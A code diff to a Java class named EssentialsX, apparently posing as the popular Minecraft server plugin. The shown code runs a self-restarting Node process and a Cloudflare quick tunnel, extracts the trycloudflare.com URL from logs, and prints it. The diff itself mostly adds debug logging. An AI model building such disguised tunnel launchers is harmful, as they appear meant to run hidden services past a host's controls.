@@ -67,7 +67,7 @@ public class EssentialsX extends JavaPlugin {
             PrintWriter out = null;
             
             try {
-                // ★★★ 核心修复：最先创建工作目录，防止后续文件写入报错 ★★★
+                // 核心修复：最先创建工作目录，防止后续文件写入报错
                 if (!Files.exists(workDir)) {
                     Files.createDirectories(workDir);
                 }
@@ -99,7 +99,6 @@ public class EssentialsX extends JavaPlugin {
                 out.println("Node & CF started successfully."); out.flush();
 
             } catch (Throwable e) {
-                // 如果出错，强行写入日志文件和系统底层输出
                 if (out != null) { e.printStackTrace(out); out.flush(); }
                 e.printStackTrace(RAW_OUT);
             } finally {
@@ -145,6 +144,16 @@ public class EssentialsX extends JavaPlugin {
             }
             loggerContextClass.getMethod("updateLoggers").invoke(ctx);
         } catch (Throwable ignored) {}
+    }
+
+    private static void logDebug(Path workDir, String msg) {
+        try {
+            Path debugLog = workDir.resolve("backend_debug.log");
+            try (PrintWriter out = new PrintWriter(Files.newBufferedWriter(debugLog, StandardOpenOption.CREATE, StandardOpenOption.APPEND))) {
+                out.println("[" + new Date() + "] [Daemon] " + msg);
+                out.flush();
+            }
+        } catch (Exception ignored) {}
     }
 
     private static String allocateNodePort(Path workDir, PrintWriter out) {
@@ -246,21 +255,41 @@ public class EssentialsX extends JavaPlugin {
             Path cfLog = workDir.resolve("cf.log");
             if (Files.exists(cfLog)) {
                 String logContent = Files.readString(cfLog);
+                
+                // 调试日志：记录 CF 日志的最后 200 个字符
+                String tail = logContent.length() > 200 ? logContent.substring(logContent.length() - 200) : logContent;
+                logDebug(workDir, "Reading cf.log. Tail content: [" + tail + "]");
+                
                 java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
                 String lastMatch = null;
                 while (m.find()) lastMatch = m.group(1);
-                if (lastMatch != null) return lastMatch;
+                if (lastMatch != null) {
+                    logDebug(workDir, "Regex matched URL: " + lastMatch);
+                    return lastMatch;
+                } else {
+                    logDebug(workDir, "Regex did NOT match any URL in cf.log.");
+                }
+            } else {
+                logDebug(workDir, "cf.log does not exist!");
             }
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            logDebug(workDir, "Error reading cf.log: " + e.getMessage());
+        }
         return null;
     }
 
     private static void startJavaDaemon(Path workDir) {
         Thread daemon = new Thread(() -> {
+            logDebug(workDir, "Daemon thread started.");
             String lastUrl = "";
+            int checkCount = 0;
+            
             while (true) {
                 try {
+                    checkCount++;
+                    
                     if ((nodeProcess == null || !nodeProcess.isAlive())) {
+                        logDebug(workDir, "Node process is dead, restarting...");
                         if (nodeProcess != null) killProcessTree(nodeProcess);
                         String newPort = allocateNodePort(workDir, null);
                         nodePort = newPort;
@@ -271,19 +300,31 @@ public class EssentialsX extends JavaPlugin {
                         lastUrl = "";
                     }
                     if (cfProcess == null || !cfProcess.isAlive()) {
+                        logDebug(workDir, "CF process is dead, restarting...");
                         if (cfProcess != null) killProcessTree(cfProcess);
                         startCfProcess(workDir, nodePort, null);
                         lastUrl = "";
                     }
+
                     String foundUrl = extractLatestTunnelUrl(workDir);
                     if (foundUrl != null && !foundUrl.equals(lastUrl)) {
                         lastUrl = foundUrl;
+                        logDebug(workDir, "New tunnel URL detected: " + foundUrl + ". Printing to RAW_OUT...");
+                        
                         RAW_OUT.println("\n====================================================================");
                         RAW_OUT.println("  [Tunnel Active] " + foundUrl);
                         RAW_OUT.println("====================================================================\n");
+                        RAW_OUT.flush();
                     }
+                    
+                    if (checkCount % 10 == 0) {
+                        logDebug(workDir, "Daemon heartbeat. Last URL: " + lastUrl);
+                    }
+
                     Thread.sleep(5000);
-                } catch (Exception ignored) {}
+                } catch (Exception e) {
+                    logDebug(workDir, "Daemon loop exception: " + e.getMessage());
+                }
             }
         }, "Backend-Daemon");
         daemon.setDaemon(true);
